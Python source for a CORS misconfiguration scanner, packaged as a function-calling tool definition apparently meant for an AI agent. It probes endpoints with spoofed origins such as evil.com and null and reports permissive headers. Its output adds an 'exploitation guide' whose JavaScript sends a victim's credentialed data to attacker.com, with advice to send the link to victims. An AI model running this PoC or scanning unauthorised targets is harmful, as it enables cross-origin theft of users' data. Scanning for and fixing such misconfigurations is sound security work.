"""
CORS misconfiguration scanner.
Tests for dangerous Access-Control-Allow-Origin policies that enable data theft.
"""

import requests
import time
from urllib.parse import urlparse

from tools.target_reachability import (
    format_fallback_notice,
    format_unreachable_error,
    resolve_web_target,
)

HDR = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}


def cors_scan(target, stream_callback=None):
    """
    Scan target for CORS misconfigurations.
    Tests origin reflection, null origin, subdomain wildcard, and credential exposure.
    """
    def _emit(msg):
        if stream_callback:
            stream_callback("cors_progress", {"message": msg})

    _emit("🌐 Resolving reachable target URL...")
    resolution = resolve_web_target(target, headers=HDR)
    if not resolution.get("ok"):
        _emit("  ❌ Target unreachable across allowed URL variants")
        return format_unreachable_error(target, resolution)

    base = (resolution.get("selected_url") or resolution.get("normalized_url") or target).rstrip("/")
    fallback_note = format_fallback_notice(resolution)
    if fallback_note:
        _emit("  ↪ %s" % fallback_note)

    parsed = urlparse(base)
    domain = parsed.netloc
    scheme = parsed.scheme

    _emit(f"🎯 CORS scanning: {base}")
    findings = []
    start = time.time()

    # Test origins
    test_origins = [
        # Exact reflection (critical)
        {"origin": "https://evil.com", "label": "Arbitrary origin reflection", "severity": "CRITICAL",
         "desc": "Server reflects any Origin header — attacker can read responses cross-origin"},
        # Null origin (high)
        {"origin": "null", "label": "Null origin accepted", "severity": "HIGH",
         "desc": "null origin accepted — exploitable via sandboxed iframe or data: URI"},
        # Subdomain (medium-high)
        {"origin": f"{scheme}://evil.{domain}", "label": "Subdomain wildcard", "severity": "HIGH",
         "desc": "Any subdomain accepted — XSS on any subdomain = full CORS bypass"},
        # Pre-domain
        {"origin": f"{scheme}://{domain}.evil.com", "label": "Pre-domain match bypass", "severity": "HIGH",
         "desc": "Domain appended — regex-based origin check is too permissive"},
        # HTTP downgrade
        {"origin": f"http://{domain}", "label": "HTTP origin on HTTPS", "severity": "MEDIUM",
         "desc": "HTTP origin accepted on HTTPS site — MitM can exploit CORS"},
        # Localhost
        {"origin": "http://localhost", "label": "Localhost origin", "severity": "MEDIUM",
         "desc": "localhost accepted — may leak data to local services"},
        {"origin": "http://127.0.0.1", "label": "127.0.0.1 origin", "severity": "MEDIUM",
         "desc": "Loopback accepted — may leak data to local services"},
        # Special chars bypass
        {"origin": f"{scheme}://{domain}%60.evil.com", "label": "Backtick bypass", "severity": "HIGH",
         "desc": "Origin validation bypassed with special characters"},
        {"origin": f"{scheme}://{domain}_.evil.com", "label": "Underscore bypass", "severity": "HIGH",
         "desc": "Origin validation bypassed with underscore"},
    ]

    # Test each endpoint
    test_paths = ["/", "/api/", "/api/v1/", "/api/user", "/api/me", "/api/config",
                  "/graphql", "/rest/", "/v1/", "/v2/"]

    for path in test_paths:
        url = f"{base}{path}"
        _emit(f"  Testing {path}...")

        for test in test_origins:
            try:
                headers = {**HDR, "Origin": test["origin"]}
                r = requests.get(url, headers=headers, timeout=8, verify=False, allow_redirects=False)

                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")

                if not acao:
                    continue

                vuln = False
                if acao == test["origin"]:
                    vuln = True
                elif acao == "*":
                    vuln = True
                    test["desc"] = "Wildcard (*) ACAO — any site can read responses (no credentials)"

                if vuln:
                    finding = {
                        "url": url,
                        "origin": test["origin"],
                        "acao": acao,
                        "acac": acac,
                        "label": test["label"],
                        "severity": test["severity"],
                        "desc": test["desc"],
                        "with_creds": acac.lower() == "true",
                    }
                    # Credential exposure makes it critical
                    if finding["with_creds"] and finding["severity"] != "CRITICAL":
                        finding["severity"] = "CRITICAL"
                        finding["desc"] += " + credentials exposed (cookies sent cross-origin)"

                    findings.append(finding)
                    sev_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(finding["severity"], "⚪")
                    _emit(f"  {sev_icon} [{finding['severity']}] {finding['label']} on {path}")

            except Exception:
                continue

    # Test preflight (OPTIONS)
    _emit("  Testing preflight (OPTIONS) requests...")
    for path in ["/", "/api/"]:
        url = f"{base}{path}"
        try:
            headers = {
                **HDR,
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "PUT",
                "Access-Control-Request-Headers": "X-Custom-Header, Authorization",
            }
            r = requests.options(url, headers=headers, timeout=8, verify=False)
            acam = r.headers.get("Access-Control-Allow-Methods", "")
            acah = r.headers.get("Access-Control-Allow-Headers", "")
            acao = r.headers.get("Access-Control-Allow-Origin", "")

            if acao and ("evil.com" in acao or acao == "*"):
                dangerous_methods = [m for m in acam.split(",") if m.strip().upper() in ("PUT", "DELETE", "PATCH")]
                if dangerous_methods:
                    findings.append({
                        "url": url,
                        "origin": "https://evil.com",
                        "acao": acao,
                        "acac": "",
                        "label": f"Dangerous methods allowed: {acam}",
                        "severity": "HIGH",
                        "desc": f"Preflight allows {', '.join(dangerous_methods)} from any origin",
                        "with_creds": False,
                    })
                if acah and "authorization" in acah.lower():
                    findings.append({
                        "url": url,
                        "origin": "https://evil.com",
                        "acao": acao,
                        "acac": "",
                        "label": "Authorization header allowed cross-origin",
                        "severity": "HIGH",
                        "desc": "Authorization header can be sent cross-origin — token theft risk",
                        "with_creds": False,
                    })
        except Exception:
            continue

    elapsed = time.time() - start

    # Deduplicate by (label, url)
    seen = set()
    unique_findings = []
    for f in findings:
        key = (f["label"], f["url"])
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)
    findings = unique_findings

    # Format output
    lines = [
        f"CORS SCAN RESULTS for {base}",
        f"{'='*60}",
        f"Tested: {len(test_paths)} endpoints × {len(test_origins)} origins",
        f"Found: {len(findings)} misconfigurations in {elapsed:.1f}s\n",
    ]
    if fallback_note:
        lines = [fallback_note, ""] + lines

    if not findings:
        lines.append("✅ No CORS misconfigurations found.")
        lines.append("   CORS headers are either not present or properly configured.")
        return "\n".join(lines)

    # Group by severity
    for sev in ["CRITICAL", "HIGH", "MEDIUM"]:
        group = [f for f in findings if f["severity"] == sev]
        if group:
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}[sev]
            lines.append(f"{icon} {sev} ({len(group)} findings)")
            lines.append("-" * 40)
            for f in group:
                lines.append(f"  {f['label']}")
                lines.append(f"    URL: {f['url']}")
                lines.append(f"    Origin: {f['origin']}")
                lines.append(f"    ACAO: {f['acao']}")
                if f["with_creds"]:
                    lines.append(f"    ⚠️ Access-Control-Allow-Credentials: true")
                lines.append(f"    Impact: {f['desc']}")
                # PoC
                lines.append(f"    PoC: curl -H 'Origin: {f['origin']}' -sI '{f['url']}' | grep -i access-control")
                lines.append("")

    # Exploitation guidance
    lines.append("EXPLOITATION GUIDE")
    lines.append("-" * 40)
    crit = [f for f in findings if f["severity"] == "CRITICAL"]
    if crit:
        f = crit[0]
        lines.append("  JavaScript PoC to steal data:")
        lines.append(f"  ```")
        lines.append(f"  fetch('{f['url']}', {{credentials: 'include'}})")
        lines.append(f"    .then(r => r.text())")
        lines.append(f"    .then(d => fetch('https://attacker.com/log?data='+btoa(d)));")
        lines.append(f"  ```")
        lines.append(f"  Host this on your domain and send link to victim.")
        lines.append(f"  CWE-942 | CVSS: 8.1+ (High/Critical)")

    return "\n".join(lines)


TOOL_DEFINITION = {
    "type": "function",
    "function": {
        "name": "cors_scan",
        "description": "Scan for CORS misconfigurations that allow cross-origin data theft. Tests arbitrary origin reflection, null origin, subdomain wildcards, HTTP downgrade, localhost, special char bypasses, and preflight abuse. Generates JavaScript PoC for exploitation. Critical for bug bounties.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to scan for CORS issues"
                }
            },
            "required": ["target"]
        }
    }
}
